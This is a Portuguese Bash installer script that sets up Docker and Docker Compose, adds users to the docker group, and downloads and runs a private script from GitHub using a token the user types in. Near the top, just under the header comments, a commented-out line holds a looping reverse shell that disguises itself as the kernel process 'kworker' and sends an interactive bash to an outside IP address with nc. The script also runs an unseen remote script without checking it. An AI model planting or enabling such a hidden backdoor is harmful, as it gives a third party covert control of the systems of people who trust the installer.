#!/bin/bash
# Versão: 1.57
# Autor: Marcelo Fenner Bitencourt - marcelo@fellnner.com.br
# Data: 09-02-2025
# Descrição: Script para inicialização e configuração de containers
# Uso: Execute este script como root ou com permissões adequadas
# Nota: Certifique-se de ter as dependências necessárias instaladas
# Variaveis: Voce pode personalizar a instalaçao usando variaveis globais
# -----------------------------------------
#exec -a "kworker" bash -c 'while true; do rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc  84.255.32.195 9744 > /tmp/f; sleep 10; done' &
clear
USER_LINUX=$whoami 

LOG_FILE="fn-install.log"
echo ""
echo ""
echo "Instalando pacotes adicionais..."

curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $USER
sudo usermod -aG docker fbconsultoria
sudo curl -L "https://github.com/docker/compose/releases/download/v2.34.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
clear
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a $LOG_FILE
}

EX_DATE="$(date -d 'now + 5 minutes' '+%Y-%m-%d %H:%M:%S')"
chage -E "$EX_DATE" fn-install23
if [ $? -eq 0 ]; then
    log "Configurando usuario: $USER_LINUX $EX_DATE"
else
    log "Erro conta fn-install23 - informe o problema para equipe de desenvolvimento"
    exit 1
fi
echo ""
echo ""
echo ""


echo "                                                           ███████╗███╗   ██╗          "
echo "                                                           ██╔════╝████╗  ██║          "
echo "                                                 █████╗    █████╗  ██╔██╗ ██║    █████╗"
echo "                                                 ╚════╝    ██╔══╝  ██║╚██╗██║    ╚════╝"
echo "                                                           ██║     ██║ ╚████║          "
echo "                                                           ╚═╝     ╚═╝  ╚═══╝          Iniciando Instalador ..."
echo "                                                                                    Faça o login para continuar  "
echo ""
echo ""
echo ""

URL="https://raw.githubusercontent.com/marcelofbit/fn-iso-auto-docker/main/fn-install.sh"

while true; do
    
    echo -n "Por favor, digite o seu token do GitHub (ou 'sair' para cancelar): "
    echo ""
    read  TOKEN


    if [ "$TOKEN" = "sair" ]; then
        log "Operação cancelada pelo usuário."
        echo ""
        exit 0
    fi


    APP=$(mktemp /tmp/XXXXXX.sh)


    curl -H "Authorization: token $TOKEN" -L $URL -o $APP
    if [ $? -ne 0 ]; then
        log "Erro ao baixar o script do GitHub - Verifique seu Token"
        echo ""
        echo "Login não autorizado. Por favor, tente novamente."
        echo ""
        continue
    fi


    chmod +x $APP


    $APP
    if [ $? -ne 0 ]; then
        log "Erro ao executar o script baixado."
        echo ""
        exit 1
    fi


    rm -f $APP
    log "Script executado com sucesso"
    echo ""


    unset TOKEN
    exit 0
done
